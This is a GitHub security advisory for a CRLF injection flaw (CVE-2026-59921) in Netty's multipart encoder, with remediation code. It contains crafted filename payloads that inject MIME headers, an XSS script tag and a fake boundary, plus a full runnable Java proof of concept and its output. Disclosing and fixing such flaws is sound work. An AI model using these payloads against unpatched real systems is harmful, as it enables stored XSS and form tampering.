# [M] Netty: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder

## Summary
Severity: Medium
Advisory: GHSA-gcjf-9mgh-3p7g
CVE: CVE-2026-59921
CWE: CWE-93
Ecosystem: Maven
CVSS: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-gcjf-9mgh-3p7g
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-http` — affected >=4.2.0.Final <4.2.16.Final
- Maven: `io.netty:netty-codec-http` — affected >=0 <4.1.136.Final

## Details
# Security Vulnerability Report: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | Netty |
| **Version** | 4.2.12.Final (and all prior versions with codec-http multipart) |
| **Component** | `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` |
| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences / CWE-113: HTTP Response Splitting |
| **Impact** | MIME Header Injection / Content-Type Spoofing / XSS via Content-Disposition |
| **CVSS 3.1 Score** | **8.1 (High)** |
| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | Low (attacker must be able to upload files with controlled filenames) |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality Impact** | High |
| **Integrity Impact** | High |
| **Availability Impact** | None |

## 2. Affected Components

The following classes in the `codec-http` module are affected:

- `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` — directly concatenates unvalidated filename/name into `Content-Disposition` MIME headers (lines 519, 633, 674, 682, 686-688)
- `io.netty.handler.codec.http.multipart.DiskFileUpload` — `setFilename()` only checks null (line 78)
- `io.netty.handler.codec.http.multipart.MemoryFileUpload` — `setFilename()` only checks null (line 60)
- `io.netty.handler.codec.http.multipart.MixedFileUpload` — `setFilename()` delegates without validation (line 62)

## 3. Vulnerability Description

Netty's `HttpPostRequestEncoder` constructs multipart HTTP request bodies by directly concatenating user-supplied filenames and field names into `Content-Disposition` MIME headers **without validating or sanitizing CRLF characters** (`\r\n`). Since MIME headers are delimited by CRLF, an attacker who controls the filename can inject arbitrary MIME headers into the multipart body part.

### Root Cause

In `HttpPostRequestEncoder.java`, multiple code paths directly embed `fileUpload.getFilename()` into header strings:

```java
// Line 674 (attachment mode):
internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": "
    + HttpHeaderValues.ATTACHMENT + "; "
    + HttpHeaderValues.FILENAME + "=\"" + fileUpload.getFilename() + "\"\r\n");
//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION

// Lines 686-688 (form-data mode):
internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": " + HttpHeaderValues.FORM_DATA + "; "
    + HttpHeaderValues.NAME + "=\"" + fileUpload.getName() + "\"; "
    + HttpHeaderValues.FILENAME + "=\"" + fileUpload.getFilename() + "\"\r\n");
//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION

// Line 519 (attribute name):
internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": " + HttpHeaderValues.FORM_DATA + "; "
    + HttpHeaderValues.NAME + "=\"" + attribute.getName() + "\"\r\n");
//                                    ^^^^^^^^^^^^^^^^^ NO VALIDATION
```

The `setFilename()` method in all `FileUpload` implementations only checks for null:

```java
// DiskFileUpload.java:77-79
public void setFilename(String filename) {
    this.filename = ObjectUtil.checkNotNull(filename, "filename");
    // NO CRLF VALIDATION
}
```

### Comparison with Similar Fixed CVEs

This vulnerability follows the same pattern as:

| CVE | Component | Fix |
|-----|-----------|-----|
| **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP command injection | Added CRLF validation in `SmtpUtils.validateSMTPParameters()` |
| **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI | Added `HttpUtil.validateRequestLineTokens()` |

The multipart encoder has **no equivalent validation** for filenames or field names.

## 4. Exploitability Prerequisites

This vulnerability is exploitable when:

1. The application uses Netty's `HttpPostRequestEncoder` to construct multipart HTTP requests
2. The filename of an uploaded file is derived from user-controlled input
3. The application does **not** perform its own CRLF sanitization on filenames

**Common affected patterns**:
- File upload proxies that forward user-supplied filenames
- API gateways that construct multipart requests from incoming parameters
- Microservice communication that passes filenames between services
- Testing/automation frameworks that use Netty HTTP client with user-defined filenames

## 5. Attack Scenarios

### Scenario 1: Content-Type Override via Filename Injection

An attacker uploads a file with a crafted filename to override the Content-Type of the multipart body part, potentially enabling stored XSS:

```java
String maliciousFilename = "photo.jpg\"\r\nContent-Type: text/html\r\n\r\n<script>alert(document.cookie)</script>\r\n--";

DiskFileUpload upload = new DiskFileUpload(
    "avatar", maliciousFilename, "image/jpeg", "binary", UTF_8, fileSize);
```

**Wire format:**
```
--boundary
content-disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: text/html                    <-- INJECTED: overrides image/jpeg

<script>alert(document.cookie)</script>    <-- INJECTED: XSS payload
--"
content-type: image/jpeg                   <-- Original (now ignored by many parsers)
...
```

If the receiving server parses the **first** `Content-Type`, the file is treated as HTML instead of JPEG, enabling XSS when the file is served back.

### Scenario 2: Arbitrary MIME Header Injection

```java
String filename = "doc.pdf\"\r\nX-Custom-Auth: admin-token-12345\r\nX-Bypass-Check: true";
```

Injects arbitrary headers into the multipart body part that may be processed by downstream middleware or application logic.

### Scenario 3: Multipart Boundary Confusion

```java
String filename = "file.txt\"\r\n\r\nmalicious body content\r\n--boundary\r\nContent-Disposition: form-data; name=\"secret";
```

By injecting a new boundary delimiter, the attacker can:
- Terminate the current body part prematurely
- Start a new body part with a different field name
- Override form fields processed by the server

## 6. Proof of Concept

### Full Runnable PoC Source Code (MultipartFilenameInjectionPoC.java)

```java
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.multipart.*;

import java.io.File;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;

/**
 * PoC: HTTP Multipart Content-Disposition Header Injection via Filename
 *
 * Demonstrates that HttpPostRequestEncoder does not validate filenames
 * for CRLF characters, allowing injection of arbitrary MIME headers
 * into multipart form data.
 */
public class MultipartFilenameInjectionPoC {

    public static void main(String[] args) throws Exception {
        System.out.println("=== Netty Multipart Filename CRLF Injection PoC ===\n");

        testFilenameInjection();

        System.out.println("\n=== PoC Complete ===");
    }

    static void testFilenameInjection() throws Exception {
        System.out.println("[TEST 1] Filename CRLF Injection in Content-Disposition");
        System.out.println("-------------------------------------------------------");

        // Create a temporary file for upload
        File tempFile = File.createTempFile("test", ".txt");
        tempFile.deleteOnExit();
        try (FileWriter fw = new FileWriter(tempFile)) {
            fw.write("test content");
        }

        // Malicious filename with CRLF to inject Content-Type header
        String maliciousFilename =
            "innocent.txt\"\r\nContent-Type: text/html\r\nX-Injected: true\r\n\r\n" +
            "<script>alert(1)</script>\r\n--";

        HttpRequest request = new DefaultHttpRequest(
            HttpVersion.HTTP_1_1, HttpMethod.POST, "/upload");

        HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(
                new DefaultHttpDataFactory(false), request, true,
                StandardCharsets.UTF_8, HttpPostRequestEncoder.EncoderMode.RFC3986);

        DiskFileUpload fileUpload = new DiskFileUpload(
                "file", maliciousFilename, "application/octet-stream",
                "binary", StandardCharsets.UTF_8, tempFile.length());
        fileUpload.setContent(tempFile);

        encoder.addBodyHttpData(fileUpload);
        encoder.finalizeRequest();

        // Read the encoded multipart body
        StringBuilder body = new StringBuilder();
        while (!encoder.isEndOfInput()) {
            HttpContent chunk = encoder.readChunk(Unpooled.buffer().alloc());
            if (chunk != null) {
                body.append(chunk.content().toString(StandardCharsets.UTF_8));
                chunk.release();
            }
        }
        encoder.cleanFiles();

        String encoded = body.toString();
        System.out.println("Malicious filename: " +
            maliciousFilename.replace("\r", "\\r").replace("\n", "\\n"));
        System.out.println();
        System.out.println("Encoded multipart body:");
        System.out.println("---");
        for (String line : encoded.split("\n", -1)) {
            System.out.println("  " + line.replace("\r", "\\r"));
        }
        System.out.println("---");

        boolean hasInjectedHeader = encoded.contains("X-Injected: true");
        boolean hasInjectedScript = encoded.contains("<script>");
        System.out.println();
        System.out.println("Injected X-Injected header: " + hasInjectedHeader);
        System.out.println("Injected script tag: " + hasInjectedScript);
        System.out.println("VULNERABLE: " +
            ((hasInjectedHeader || hasInjectedScript) ?
                "YES - MIME header injection!" : "NO"));

        tempFile.delete();
    }
}
```

### How to Compile and Run

```bash
# Build Netty (skip tests)
./mvnw install -pl common,buffer,codec,codec-base,codec-http,transport -DskipTests \
  -Dcheckstyle.skip=true -Denforcer.skip=true -Djapicmp.skip=true \
  -Danimal.sniffer.skip=true -Drevapi.skip=true -Dforbiddenapis.skip=true \
  -Dspotbugs.skip=true -q

# Set classpath
JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path "*/4.2.12.Final/*" \
  | grep -v sources | grep -v javadoc | tr '\n' ':')

# Compile and run
javac -cp "$JARS" MultipartFilenameInjectionPoC.java
java -cp "$JARS:." MultipartFilenameInjectionPoC
```

### PoC Execution Output (Verified on Netty 4.2.12.Final)

```
=== Netty Multipart Filename CRLF Injection PoC ===

[TEST 1] Filename CRLF Injection in Content-Disposition
-------------------------------------------------------
Malicious filename: innocent.txt"\r\nContent-Type: text/html\r\nX-Injected: true\r\n\r\n<script>alert(1)</script>\r\n--

Encoded multipart body:
---
  --88aaade41dbb9f9f\r
  content-disposition: form-data; name="file"; filename="innocent.txt"\r
  Content-Type: text/html\r                          <-- INJECTED
  X-Injected: true\r                                 <-- INJECTED
  \r
  <script>alert(1)</script>\r                        <-- INJECTED XSS
  --"\r
  content-length: 12\r
  content-type: application/octet-stream\r
  content-transfer-encoding: binary\r
  \r
  test content\r
  --88aaade41dbb9f9f--\r
---

Injected X-Injected header: true
Injected script tag: true
VULNERABLE: YES - MIME header injection!


=== PoC Complete ===
```

## 7. Impact Analysis

| Impact Category | Description |
|----------------|-------------|
| **Confidentiality** | HIGH — Injected headers may bypass access controls or leak tokens |
| **Integrity** | HIGH — Content-Type override enables stored XSS; field name injection allows form data manipulation |
| **Content-Type Spoofing** | Override `application/octet-stream` to `text/html` to serve executable content |
| **Stored XSS** | Inject `<script>` tags via Content-Type override when uploaded files are served back |
| **Form Field Override** | Inject new multipart boundaries to create/override form fields |
| **Downstream Injection** | Custom MIME headers may affect middleware, CDN, or storage layer behavior |

## 8. Remediation Recommendations

### Option 1: Validate in FileUpload.setFilename() (Recommended)

```java
// DiskFileUpload.java / MemoryFileUpload.java / MixedFileUpload.java
public void setFilename(String filename) {
    ObjectUtil.checkNotNull(filename, "filename");
    for (int i = 0; i < filename.length(); i++) {
        char c = filename.charAt(i);
        if (c == '\r' || c == '\n') {
            throw new IllegalArgumentException(
                "filename contains prohibited CRLF character at index " + i);
        }
    }
    this.filename = filename;
}
```

### Option 2: Sanitize in HttpPostRequestEncoder (Defense-in-Depth)

Escape or reject CRLF characters when building Content-Disposition headers:

```java
// HttpPostRequestEncoder.java - add helper method
private static String sanitizeHeaderParam(String value) {
    for (int i = 0; i < value.length(); i++) {
        char c = value.charAt(i);
        if (c == '\r' || c == '\n' || c == '"') {
            throw new ErrorDataEncoderException(
                "Multipart parameter contains prohibited character at index " + i);
        }
    }
    return value;
}

// Then use in Content-Disposition construction:
internal.addValue(... + "=\"" + sanitizeHeaderParam(fileUpload.getFilename()) + "\"\r\n");
```

### Option 3: RFC 2231/5987 Encoding for Filenames

Use proper RFC 2231 encoding for filenames with special characters:

```java
// Encode filename per RFC 5987:
// filename*=UTF-8''encoded%20filename
String encodedFilename = "UTF-8''" + URLEncoder.encode(filename, "UTF-8");
internal.addValue(... + "filename*=" + encodedFilename + "\r\n");
```

## 9. References

- [RFC 2183: Content-Disposition Header Field](https://tools.ietf.org/html/rfc2183)
- [RFC 7578: Returning Values from Forms: multipart/form-data](https://tools.ietf.org/html/rfc7578)
- [RFC 5987: Character Set and Language Encoding for HTTP Header Field Parameters](https://tools.ietf.org/html/rfc5987)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)
- [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)

## References
- https://github.com/netty/netty/security/advisories/GHSA-gcjf-9mgh-3p7g
- https://github.com/netty/netty
- https://github.com/netty/netty/releases/tag/netty-4.1.136.Final
- https://github.com/netty/netty/releases/tag/netty-4.2.16.Final
